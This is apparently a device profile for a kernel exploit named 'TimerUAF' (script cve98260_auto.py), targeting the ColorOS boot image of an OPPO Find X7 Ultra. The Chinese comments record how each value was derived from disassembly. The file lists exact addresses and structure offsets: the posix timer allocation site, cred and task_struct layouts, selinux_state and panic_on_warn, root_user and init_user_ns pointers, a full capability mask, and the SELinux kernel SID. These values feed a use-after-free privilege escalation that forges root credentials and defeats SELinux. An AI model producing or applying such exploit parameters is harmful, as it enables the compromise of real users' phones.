# TimerUAF kernel profile (HOCON; JSON remains valid)
# Device: OPPO Find X7 Ultra (PHY110 / OP5D3D), ColorOS 17 官方包 boot.img
# kernel 6.1.157-android14-11-o-g78ff3c4bea38
#
# 来源：cve98260_auto.py 自动推导（kallsyms + 反汇编 + IKCONFIG）
# 注意：这个 boot.img 里没有 .BTF（GKI 的 Image 通常是 strip 过的），
# 工具因此判 INCOMPLETE。以下结构体偏移是逐项用反汇编/符号复核出来的，
# 不是照抄别的机型，复核依据写在每条注释里。
release = "6.1.157-android14-11-o-g78ff3c4bea38"
schema_version = 1
ksu_kmi = "android14-6.1"

# do_timer_create+0xa4 -> bl kmem_cache_alloc(posix_timers_cache)
# 返回地址 = do_timer_create(0xffffffc00844bb60) + 0xa8
timer_site = 0xffffffc00844bc08
# 6.1 的 struct k_itimer = 264；代码里 size 走 cachep->object_size（没有 mov w2），
# 静态读不出来，沿用 6.1 分支的 0x108，上机前用 slabinfo 复核
timer_alloc = 0x108

# cred_jar：sizeof(struct cred)=0xb0，HWCACHE_ALIGN 后 0xc0
cred_req = 0xb0
cred_alloc = 0xc0
# init_cred 实测：+0x00 usage=4（4 字节）→ uid 在 +0x04
cred_uid_off = 0x4

# 链接期符号（_text = 0xffffffc008000000）
selinux_state = 0xffffffc00a29bda0
panic_on_warn = 0xffffffc00a04b2c8

# task_struct.cred
# __arm64_sys_getuid @0xffffffc0080e6054:
#   mrs x8, sp_el0 ; ldr x8,[x8,#0x838] ; ldr w8,[x8,#4]
task_cred_off = 0x838
# copy_process @0xffffffc0083e72a0，+0x15c bl kmem_cache_alloc_node(task_struct_cachep)
# 返回地址 = 0xffffffc0083e7400 → & 0x1fffff
copy_process_low21 = 0x1e7400
# init_task @0xffffffc00a05fc00，其后的下一个符号 debug_enabled 在 +0x12c0
# => sizeof(struct task_struct) = 0x12c0（4800），非猜测
task_alloc_bytes = 0x12c0

# capability 与 fake-cred 里的引用对象
fullcap = 0x1ffffffffff
# init_cred+0x80/0x88/0x90/0x98 实测，与下面四个符号逐个吻合
root_user = 0xffffffc00a070d40
init_user_ns = 0xffffffc00a070ab0
init_ucounts = 0xffffffc00a0725c8
init_groups = 0xffffffc00a072060

# task_security_struct（LSM blob）：6.1 走 blob，tsec 在 lbs_cred 偏移
selinux_blob_off = 0x8
selinux_sid_kernel = 1
